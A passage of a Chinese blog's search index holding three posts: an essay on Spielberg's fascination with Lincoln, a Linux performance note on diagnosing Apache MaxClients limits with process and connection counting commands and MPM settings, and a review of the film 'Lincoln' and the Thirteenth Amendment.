        <tag>Engineering</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>Lincoln Research:斯皮尔伯格的林肯情怀</title>
    <url>/2017/05/13/Lincoln-Spielberg/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>讲故事的人：斯皮尔伯格的林肯情怀</li>
</ul>
<a id="more"></a>
<p>2012年11月9日，电影《林肯》在北美首映。</p>
<p>该片在美国本土累计票房1.82亿美元，全球总票房2.75亿美元（2011年10月17日开拍，同年12月19日杀青，预算：6500万美元）。除了票房大获成功，在业内也赢得一片赞美之声：荣获第70届金球奖及第85届奥斯卡金像奖，媒体综合评分高达88分，《芝加哥论坛报》、《华盛顿邮报》、《华尔街时报》、《纽约时报》等多家媒体给出满分；烂番茄新鲜度高达91%。</p>
<p>“路易斯与斯皮尔伯格的大师级合作令人惊异，成片俨然超越了我们的想象，直接飞升为旷世的艺术赞歌。” 时人给予了大师作品极高的评价。</p>
<p>斯皮尔伯格给出的解释是：“我的影片几乎无不植根于我的童年经历。”</p>
<h2 id="童年时代"><a href="#童年时代" class="headerlink" title="童年时代"></a>童年时代</h2><p>亚伯拉罕-林肯是斯皮尔伯格最持久的执念，他的林肯情怀可以追溯到童年时代。在他七八岁的时候，他的一个叔叔带着他去华盛顿参观历史名胜，而最让他难忘的一处景点就是林肯纪念堂——他在那里吓了一跳。</p>
<blockquote>
<p>“我很小，而林肯很高大，坐在宝座，就是那把大椅子上。我被这尊雕像深深地震慑住了，几乎不敢直视林肯的脸。”</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK_%20Memorial.png" alt="林肯纪念堂"></p>
<p>然而，这并未阻止他阅读关于林肯的东西。“现在我知道我曾经患有阅读困难症——当时我并不知道——但是当我开始阅读时，提到林肯的材料永远比学校的理科习题更能让我读进去。”他补充道，“能做的事我都做了，除了买一辆林肯车——我什么都有，就是没有车。我读了很多书，看了很多纪录片。”   “每当探究一段我不是很了解的历史时，我的第一反应就是气氛老师从没教过我这东西。”</p>
<h2 id="预约剧本"><a href="#预约剧本" class="headerlink" title="预约剧本"></a>预约剧本</h2><p>直到1999年，斯皮尔伯格遇到了多丽丝-科恩斯-古德温，询问她接下来准备做什么。她表示自己想写一本讲述林肯任总统期间的书，而斯皮尔伯格对此做出的答复是：“我会买的。” 她说她连出版商都没找到，他回答道：“这与我无关。我现在就要向你买下它，等你找到出版商的时候，只要告诉他们你已经把电影版权给了我和梦工厂就行。” （《Team of Rivals: The Political Genius of Abraham Lincoln 》（林肯与劲敌幕僚））</p>
<blockquote>
<p>“如果一部电影要反映某种现实生活中的境遇，它必须把所有真实的故事讲得像正弦曲线一样波澜起伏，也就是说要有荒诞，有喜剧，有痛失，有强大的顽固势力对你穷追不舍，然后最终得到救赎。”</p>
</blockquote>
<p>书成之后，剧本改编的过程也颇为艰难。<br>剧本初稿长达约550页——一个典型电影剧本的长度通常约为120页。剧本中有一段内容引起了斯皮尔伯格的共鸣。它讲述了废除奴隶制的美国宪法第十三条修正案的通过，以及美国内战的结束。换句话说，这些事件发生在林肯生命中的最后几个月里。斯皮尔伯格让库什纳重点描写这一部分，而最终定稿的剧本约为有150页，片长约为两个半小时。</p>
<h2 id="Think-different"><a href="#Think-different" class="headerlink" title="Think different"></a>Think different</h2><blockquote>
<p>“我就像一个眼馋肚饱的小孩。我想拍的电影实在太多了，我曾经在闲坐无事时纳闷为何没人去拍关于这样那样题材的电影。现在，我可以亲自拍摄那些被遗漏的电影了。”</p>
</blockquote>
<p>大师的意义也许就在于不断突破自己。<br>从早期的《侏罗纪公园》、《大白鲨》、《E.T.外星人》，无不在全球掀起一场轰动，突破了人们原有的想象空间。斯皮尔伯格后来的作品又将视角延伸至大屠杀、奴隶制度、战争等题材，包括《林肯》在内，陆续拍摄了《辛德勒的名单》、《拯救大兵瑞恩》、《战马》、《间谍之桥》等一系列作品，他作为犹太裔家庭出身的美国人，也算是一次家国历史的回溯反思。从这些作品中，多少总能品味出些许对人类、对生命的终极关怀，也许这就是他能与林肯心灵相通的原因所在吧。</p>
<blockquote>
<p>“其实每一部电影都是一个时间胶囊，当你拍完一部影片、向演职人员道别时，你也把一段生命埋在了那个片场——你知道的，而那段生命将会永远留在那里。”</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK_Back.png" alt="《林肯》剧照"></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>1.《讲故事的人：斯皮尔伯格传》 [ 美 ]理查德-什克尔  ISBN 978-7-5502-4662-1</p>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
        <tag>Lincoln</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 性能诊断：Web Server</title>
    <url>/2018/06/11/Linux-Perf-App/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Web Server 性能分析</p>
<ul>
<li>Apache vs Nginx</li>
<li>JVM vs Go</li>
</ul>
<span id="more"></span>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">[Wed Jul 25 22:19:05 2018] [error] server reached MaxClients setting, consider raising the MaxClients setting</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 持续输出进程数</span></span><br><span class="line">$ watch <span class="string">&quot;pgrep httpd | wc -l&quot;</span></span><br><span class="line">Every <span class="number">2.0</span>s: pgrep httpd | wc -l     Thu Jul <span class="number">26</span> <span class="number">21</span>:<span class="number">12</span>:<span class="number">12</span> <span class="number">2018</span></span><br><span class="line"><span class="number">42</span></span><br><span class="line">$ ps  -ylC httpd --<span class="keyword">sort</span>:rss</span><br><span class="line">S   UID    PID   PPID  C PRI  NI   RSS    SZ WCHAN  TTY          TIME CMD</span><br><span class="line">S   <span class="number">501</span>  <span class="number">37620</span>      <span class="number">1</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span>  <span class="number">1268</span> <span class="number">11253</span> poll_s ?        <span class="number">00</span>:<span class="number">14</span>:<span class="number">17</span> httpd</span><br><span class="line">S   <span class="number">501</span>  <span class="number">37622</span>  <span class="number">37620</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span>  <span class="number">1708</span> <span class="number">11320</span> inet_c ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> httpd</span><br><span class="line">S   <span class="number">501</span>  <span class="number">37623</span>  <span class="number">37620</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span>  <span class="number">1708</span> <span class="number">11320</span> inet_c ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> httpd</span><br><span class="line">S   <span class="number">501</span>  <span class="number">37624</span>  <span class="number">37620</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span>  <span class="number">1708</span> <span class="number">11320</span> inet_c ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> httpd</span><br><span class="line">S   <span class="number">501</span>  <span class="number">37625</span>  <span class="number">37620</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span>  <span class="number">1708</span> <span class="number">11320</span> inet_c ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> httpd</span><br><span class="line">.....</span><br><span class="line"><span class="comment">## 当前连接数</span></span><br><span class="line">$ netstat -an | <span class="keyword">grep</span> :<span class="number">2003</span> | wc -l</span><br><span class="line"><span class="number">172</span></span><br><span class="line"><span class="comment"># 累计消耗内存（M）</span></span><br><span class="line">$ ps aux|<span class="keyword">grep</span> -v <span class="keyword">grep</span>|awk <span class="string">&#x27;/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/1024&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 平均每个进程消耗内存（M）</span></span><br><span class="line">$ ps aux|<span class="keyword">grep</span> -v <span class="keyword">grep</span>|awk <span class="string">&#x27;/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/n/1024&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="Apache-Server-MPM"><a href="#Apache-Server-MPM" class="headerlink" title="Apache Server MPM"></a>Apache Server MPM</h4><blockquote>
<p>问题：为什么 Apache HTTP Server 启动有多个进程</p>
</blockquote>
<p>多处理模块(Multi -Processing Modules，MPM)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ ./httpd -V</span><br><span class="line">Server version: Apache/<span class="number">2.2</span><span class="number">.31</span> (Unix)</span><br><span class="line">......</span><br><span class="line">Architecture:   <span class="number">64</span>-bit</span><br><span class="line">Server MPM:     Prefork</span><br><span class="line">  threaded:     no</span><br><span class="line">    forked:     yes (variable process count)</span><br><span class="line">Server compiled with....</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Prefork 工作模式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//httpd.conf 默认配置</span></span><br><span class="line">&lt;IfModule prefork.c&gt;       </span><br><span class="line">StartServers      <span class="number">8</span>          # 服务初始化的工作进程数（work process）</span><br><span class="line">MinSpareServers    <span class="number">5</span>         # 保持的最少空闲进程数</span><br><span class="line">MaxSpareServers     <span class="number">20</span>       # 保持的最大空闲进程数</span><br><span class="line">ServerLimit      <span class="number">256</span>         # 保持的最大活动进程数，设定MaxClients的上限值</span><br><span class="line">MaxClients       <span class="number">256</span>         # 最大并发连接数</span><br><span class="line">MaxRequestsPerChild  <span class="number">4000</span>    # 每个子进程在生命周期能服务的最大请求数,即控制每个进程在处理了多少次请求之后自动销毁</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Worker 工作模式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//httpd.conf 默认配置</span></span><br><span class="line">&lt;IfModule worker.c&gt;</span><br><span class="line">StartServers       <span class="number">4</span>         # 初始化的子进程数</span><br><span class="line">MaxClients        <span class="number">300</span>        # 并发请求最大数</span><br><span class="line">MinSpareThreads     <span class="number">25</span>         # 最小空闲线程数total=所有进程的线程数加起来</span><br><span class="line">MaxSpareThreads     <span class="number">75</span>         # 最大空闲线程数</span><br><span class="line">ThreadsPerChild     <span class="number">25</span>         # 每个子进程可生成的线程数</span><br><span class="line">MaxRequestsPerChild   <span class="number">100</span>      # 每个子进程可服务的最大请求数,<span class="number">0</span>表示不限制,建议设置为非<span class="number">0</span></span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure></li>
<li>Event 工作模式</li>
</ul>
<h2 id="Apache-vs-Nginx"><a href="#Apache-vs-Nginx" class="headerlink" title="Apache vs. Nginx"></a>Apache vs. Nginx</h2><ul>
<li><a href="https://www.tecmint.com/monitor-nginx-performance-using-netdata-on-centos-7/">How to Monitor Nginx Performance Using Netdata on CentOS 7</a></li>
</ul>
<h2 id="JVM-vs-Go-App"><a href="#JVM-vs-Go-App" class="headerlink" title="JVM vs. Go App"></a>JVM vs. Go App</h2><ul>
<li><a href="https://blog.twitch.tv/go-memory-ballast-how-i-learnt-to-stop-worrying-and-love-the-heap-26c2462549a2">Go memory ballast: How I learned to stop worrying and love the heap</a></li>
</ul>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h4 id="案例与实务"><a href="#案例与实务" class="headerlink" title="案例与实务"></a>案例与实务</h4><ul>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">最佳工程实践：Stack Overflow 架构 - 2016 Edition</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">最佳工程实践：Oracle 数据库迁移割接实践</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/">最佳工程实践：基于LVS的AAA负载均衡架构实践</a>  </li>
<li><a href="https://code.facebook.com/posts/1906146702752923/open-sourcing-katran-a-scalable-network-load-balancer/">VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-performance-tuning-practice/index.html">Java 应用性能调优实践</a></li>
<li><a href="https://mp.weixin.qq.com/s/4Y77jUqfgKeBS2hnitrUrg">动态追踪技术-应用性能瓶颈排障利器之火焰图</a></li>
<li><a href="http://blog.jobbole.com/91920/">Apache的三种MPM模式比较：prefork，worker，event</a></li>
<li><a href="http://blog.51cto.com/skypegnu1/1532333">Apache HTTP Server 中prefork和worker工作模式（二）</a></li>
<li><a href="https://support.plesk.com/hc/en-us/articles/213389769-Sites-are-very-slow-Apache-shows-server-reached-MaxClients-setting-on-Plesk-for-Linux">Sites are very slow. Apache shows: server reached MaxClients setting on Plesk for Linux</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Lincoln Research:电影评论|灵魂解码《林肯》</title>
    <url>/2016/09/10/Lincoln/</url>
    <content><![CDATA[<blockquote>
<p>在伟大领袖们的脚步声中，我们可以听到历史的滚滚雷声。——理查德·尼克松</p>
</blockquote>
<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>《林肯》由普立策奖得主Tony Kushner担任编剧，史蒂文·斯皮尔伯格执导，丹尼尔·戴·刘易斯等主演，2012年11月16日在上映。影片讲述了林肯在最后一段生命历程中结束南北战争、重新统一美国、推动废除奴隶制的故事。</p>
<p>实话说，大概3年前刚看这部片子时，其实没有什么感觉，甚至略显乏味。可能是随着哲学史观的一些变化、生活阅历的加深，慢慢对于这部片子的理解也越来越深，现在它的地位在我心目中是属于圣殿级的史诗作品。</p>
<p>这篇影评算起来已经酝酿了两年以上，今年又反复重看了N遍，每一次都能揣摩出一些新意，感觉是时候总结一下了。2016年07、08月，正式开始构思、完成第一稿提纲，09月03日～04日，完成第一稿写作。这一版算作概要，如果机缘成熟，还想针对其中一些专门问题作深入挖掘，希望能写成一个系列。</p>
<a id="more"></a>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-TITLE.png" alt></p>
<h2 id="一、艺术风格"><a href="#一、艺术风格" class="headerlink" title="一、艺术风格"></a>一、艺术风格</h2><h4 id="1-1-镜头"><a href="#1-1-镜头" class="headerlink" title="1.1 镜头"></a><strong>1.1 镜头</strong></h4><p>全剧的时间跨度为1865年1月～1865年4月15日，合计约100天左右。即南北战争的最后的僵持阶段，但是包含了结束战争、重新统一、通过宪法第十三条修正案、林肯遇刺等诸多重大事件。</p>
<p>第一个镜头就是战争中的肉搏画面，血腥、残酷、压抑，虽然通过随后一段士兵与总司令的对话稍微缓和了气氛，但是基本上奠定了全剧阴郁的镜头风格。剧情场景设定上，大部分都发生在室内，因而人物的特写镜头特别多，喜欢借用装饰、光影变化表达人物情绪，表情刻画非常细腻。</p>
<p>总的，导演并没有致力于恢弘的叙事套路，少数几个重大战役的镜头也更多是为了起承转合，推动剧情的发展。第一遍粗看的话，也体验不到英雄史诗的味道，而且由于时间被高度压缩，镜头切换节奏很快，跳跃的地方很多。</p>
<h4 id="1-2-音乐"><a href="#1-2-音乐" class="headerlink" title="1.2 音乐"></a><strong>1.2 音乐</strong></h4><p>基调是古典主义音乐风格，钢琴、小提琴大量应用，还大量使用了南北战争时期美国的民间小调、军乐队、歌剧等音乐元素，典雅而不失历史现场感动。<br>另外，道具音效也颇具匠心。比如时常出现的林肯的表的滴答声，据说这是斯皮尔伯格专门跑到博物馆里，录制林肯当年所使用的手表的走时声。<br><img src="http://riboseyim-qiniu.riboseyim.com/LK-Band.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/LK-Song.png" alt></p>
<h4 id="1-3-台词"><a href="#1-3-台词" class="headerlink" title="1.3 台词"></a><strong>1.3 台词</strong></h4><p>本片的台词鉴赏至少都需要一篇专文的厚度才能完成，可以这么说，这是一部依靠精彩对白支撑的电影。最主要的对白主要发生在众议院，各派力量围绕是否通过法案展开了有序、激烈地质询、演讲、辩论，原来吵架还可以玩得这么有艺术，堪称一部教学片。</p>
<p>此外,第一家庭内部的生活对话、总统幕僚团队的决策会议、林肯与各派别领袖的观点交锋、南北双方的和平谈判以及林肯那些个风趣幽默的小段子。</p>
<h4 id="1-4-色彩"><a href="#1-4-色彩" class="headerlink" title="1.4 色彩"></a><strong>1.4 色彩</strong></h4><p><em>主色调：忧郁</em><br>影片的整体基色几乎沉浸在一片灰蓝色的幽暗之中，这个印象表面上是为了表达战争的残酷血腥，现实中推动法案的强大阻力。作为一部传记电影，导演并没有忘记告诉观众，这其实一部悲剧：主人公正在一步一步迈向死亡。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-War-1.jpg" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-War-2.jpg" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-War-3.jpg" alt><br>在剧情发展的关键时刻的时候，很多次都从昏暗的室内切换到室外，难得一见的阳光，映衬着白云、绿草，鲜亮明媚，配上欢快的背景音乐，颇似点睛之笔。<br>(img)</p>
<h2 id="二、故事剧情"><a href="#二、故事剧情" class="headerlink" title="二、故事剧情"></a>二、故事剧情</h2><h4 id="2-1-主线：废除奴隶制"><a href="#2-1-主线：废除奴隶制" class="headerlink" title="2.1 主线：废除奴隶制"></a>2.1 主线：废除奴隶制</h4><p>奴隶制在美国可谓由来已久，甚至从北美殖民地开创之初就已经存在，独立战争之后的1787年宪法还予以合法化，伴随着西部殖民扩张和产业革命，甚至得到了发展壮大。截止到南北战争之前，1860年奴隶增长到近400万人,其中3/4在种植园里劳动。奴隶在美国南部的总人口中占1/3上下。</p>
<p>电影剧情的主要是背景是：南北战争后期，林肯致力于促使国会（众议院）通过针对美国宪法的第十三条修正案，即废除奴隶制法案。围绕着该法案，战争双方、各党派代表人物展开了激烈的博弈。</p>
<h4 id="2-2-第十三条修正案"><a href="#2-2-第十三条修正案" class="headerlink" title="2.2 第十三条修正案"></a>2.2 第十三条修正案</h4><p>比起中国人民熟悉著名的《解放黑人奴隶宣言》，第十三条宪法修正案并不为人熟知。1787年美国宪法诞生及其后近230多年的成长历程，宪法典之后发展出已生效的27条宪法修正案，为这个民族国家提供了一个稳固的制度框架。</p>
<blockquote>
<p>宪法在这个法律帝国圣殿中居于雷打不动的王冠似的统治地位，是一切行为的牢固基础，是一具有基础性、权威性和准宗教性的文本。</p>
</blockquote>
<p>依据美国宪法第5条规定：其唯一正式修改宪法的形式是宪法修正案。宪法修正案是美国宪法的重要组成部分，代表了美国宪法制度额基本发展路径及方向。</p>
<p>另外，为了体现宪法修正案的权威性，其修改门槛极高：由国会两院（参议院、众议院）各以2/3多数议员认为必要且通过后提出，或由3/4多数的州议会或3/4多数的州制宪会议批准。</p>
<p>从法律地位上说，《解放黑人奴隶宣言》属于行政命令而不是宪法范畴，只需要林肯总统签署即可生效，最多也只能代表这一届政府的主张。如果需要永久地废除奴隶制，就必须对1787年宪法作出修正，这就是林肯在战争后期甘愿冒着政治风险，也要推动法案通过的原因所在。</p>
<p>美国宪法第十三条修正案的文本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AMENDMENT XIII</span><br><span class="line">SECTION 1. Neither slavery nor involuntary servitude,except as a punishment for crime whereof the party shall have been duly convicted,shall exist within the United States,or any place subject to their jurisdiction.</span><br><span class="line">第一款 合众国境内或属合众国管辖之任何地区内，不准有奴隶制或强迫劳役存在，唯有以对业经定罪之罪犯作为惩罚者不在此限。</span><br><span class="line"></span><br><span class="line">SECTION 2. Congress shall have power to enforce this article by appropriate legislation.</span><br><span class="line">第二款 国会有权为实施本条而制定适当之立法。</span><br></pre></td></tr></table></figure>
<h4 id="2-3-角斗场：众议院"><a href="#2-3-角斗场：众议院" class="headerlink" title="2.3 角斗场：众议院"></a>2.3 角斗场：众议院</h4><p>剧情设定的主要空间背景是：国会参议院议事大厅。<br>为了便于理解，我们需要梳理一下美国政治制度体系的关键组成部分。</p>
<p>美国宪法体制简图：<br><img src="http://riboseyim-qiniu.riboseyim.com/USA-LAW-TOP.png" alt><br>近200多年以来，该制度体系的内容和技术细节一直都在调整，展开来说非常复杂，但是核心框架和设计内涵主要有以下几点：</p>
<ol>
<li>实行普遍的直接选举制</li>
<li>立法、行政、司法三权分立，互相监督，立法机关居于治理核心地位。</li>
<li>参议院：定额100名，每个州选2名参议员，6年一任；<br> 每2年改选1/3，主要关注外交、国防、重要人事任命等；<br> 承袭古罗马元老院（Senate）之名。</li>
<li>众议院：按照州的人口数，按比例分配，2年一任，2年全部改选一次。除了广泛的立法权，还特别包括弹劾政府公职人员（包括总统），『所有将增加岁入的法案应由众议院首议』，参议院无权提案征税。</li>
<li>总统：掌握行政权，作为政府首脑负责组阁，同时作为军队最高统帅。通常（非宪法定义）是所在政党领袖。</li>
<li>司法：奉行司法独立原则，法官行使审判权。<br>美国宪法没有直接提到美国联邦最高法院是否有司法审查权。但是通过的马伯里诉麦迪逊案（1803）的判决指出，美国联邦最高法院有权宣布某个法律违宪而不被采用。因而剧中的一次讨论中提到，林肯签署的《解放黑人奴隶宣言》可能被最高法院推翻，是有事实依据的。</li>
</ol>
<p>综上所述，剧情背景中，虽然修宪法案已经在参议院通过，并且共和党当时也占据了政府和国会的优势地位，但是要达到在众议院通过的门槛，是有非常大难度的。<br><img src="http://riboseyim-qiniu.riboseyim.com/LK-Congress-1.png" alt><br>对于国人来说，最需要理解是议会运作中的很多术语：动议、附议、陈述、辩论、表决等。这方面建议最好先读一读美国人自己写的《罗伯特议事规则》（Robert’s Rules of Order）这本书，它就像一部设计良好的机器一样，能够有条不紊地让各种意见得以表达，用规则来压制各自内心私利的膨胀冲动，求同存异，然后按照规则表决。这种规则及所设计的操作程序，既保障了民主，也保障了效率。</p>
<h4 id="2-4-拉票是一门艺术"><a href="#2-4-拉票是一门艺术" class="headerlink" title="2.4 拉票是一门艺术"></a>2.4 拉票是一门艺术</h4><p>林肯竞选连任第二个任期两个月之后，开始快速推动法案在国会通过。</p>
<p>为了在最后的投票环节达到2/3的多数，林肯团队展开了疯狂地拉票活动。<br>这部分剧情是最受争议的部分，虽然史实未必如此，但是估计也差不到那里去。</p>
<p><strong>战略上，促成了共和党内的空前团结</strong></p>
<p>1）协调众议院党团<br>充分信任、倚重““党鞭”，确保共和党议员可以一致行动<br>2）巩固共和党内保守派支持<br>同意任命保守派领袖为总统特使，与南方邦联接触，展开秘密和平谈判，安抚保守派要求迅速结束战争的诉求。<br>3）团结共和党内激进派<br>林肯属于保守派，而激进派的诉求包括彻底废除奴隶制、严厉惩罚南方邦联、赋予黑人投票权等一系列在当时比较“激进”的政策主张，显然是与林肯的施政纲领是冲突的。甚至于私人关系方面，激进派领袖斯蒂文斯，曾经领衔调查第一夫人的“财务问题”，因而两家人的关系一度很僵。<br>林肯凭借个人的人格魅力，亲自与斯蒂文斯沟通，互相妥协，在宪法修正案的问题是达成了战略合作。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Role-Bulaier-Family.png" alt></p>
<p><strong>战术上，针对民主党议员展开全面公关</strong></p>
<p>由国务卿苏华德亲自领导，成立了一个秘密的“拉票小分队”。<br>特别针对60多名即将届满的民主党众议员，实施全面地地下公关行动，力求再争取中间摇摆的、关键性的20张赞成票，从这个角度看，这些行动又是战略性的。<br>1)直接金钱贿赂<br>能用钱解决的绝不多说半句废话。<br>2)间接职务贿赂<br>利用林肯政府掌握的人事任命权，为即将失业的众议员提供“工作机会”。<br>3)其它政治利益交换</p>
<p><strong>最后关头，林肯亲自出马展开温情攻势</strong></p>
<p>对于关键少数票，林肯亲自出马，或邀请面谈，或登门拜访，一家一家作工作，晓之以理、动之以情，这总统当得也是没谁了。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Role-Yemen-8.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Night-Vistor.png" alt></p>
<h2 id="三、人物形象"><a href="#三、人物形象" class="headerlink" title="三、人物形象"></a>三、人物形象</h2><blockquote>
<p>多数历史书籍写的都是历史事件，只是偶尔写到在历史上起了作用的人物。</p>
</blockquote>
<p>这部电影的成功之处还在于，以林肯为中心，塑造了一批该时代的精英人物形象。<br><img src="http://riboseyim-qiniu.riboseyim.com/林肯人物简谱.png" alt></p>
<h4 id="3-1-林肯"><a href="#3-1-林肯" class="headerlink" title="3.1 林肯"></a>3.1 林肯</h4><p>本剧中丹尼尔·戴-刘易斯的演技几近逆天，将林肯的多重形象巧妙融合：</p>
<p><strong>忧郁症患者</strong>：本剧中的林肯形象，总体上温文尔雅、谦逊有礼，但是总给人一种阴郁、忧伤的气质。无论是现实中，还是美国人民的印象中，林肯是一个苦命的人。包括但不仅限于：出身于贫寒家门、初恋女友有缘无份，第一夫人是贵族千金但是出了名的尖酸刻薄长得丑，长期没有固定职业、屡战屡败、多次落选、幼子早殇……</p>
<p><strong>段子手</strong>：全剧中有好几个精彩片段，林肯在众人一片惊恐、绝望的情况下开始讲故事，幽默风趣，极尽调侃，引得众人忍不住发笑，很快就扭转了现场的气氛。也许得益于林肯早期自学时期，熟读莎士比亚著作的缘故，这也从另外一个角度阐释了，林肯作为领导者的人格魅力。我想大家都会喜欢这样的领导。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Story-2.png" alt></p>
<p><strong>政治家</strong>：反对派在议会演讲中称林肯为“凯撒、独裁者”。虽然在日常镜头中，导演力求表现林肯谦逊、温情的一面，但是在关键时刻，也把他作为政治家的一面表现得淋漓尽致。</p>
<blockquote>
<p>伟大的领导是一种特有的艺术形式，既需要超群的力量，有需要非凡的想象力。</p>
</blockquote>
<p>林肯对于施政目标——废除奴隶制，有着坚定的、无可动摇的信念。不但先于群众找到通向未来的道路，还在精英集团都无所适从的时候，敢于坚持自己的见解。</p>
<blockquote>
<p>林肯认识到自己的命运所向，而且对此深信不疑，这成了他毕生的动力。</p>
</blockquote>
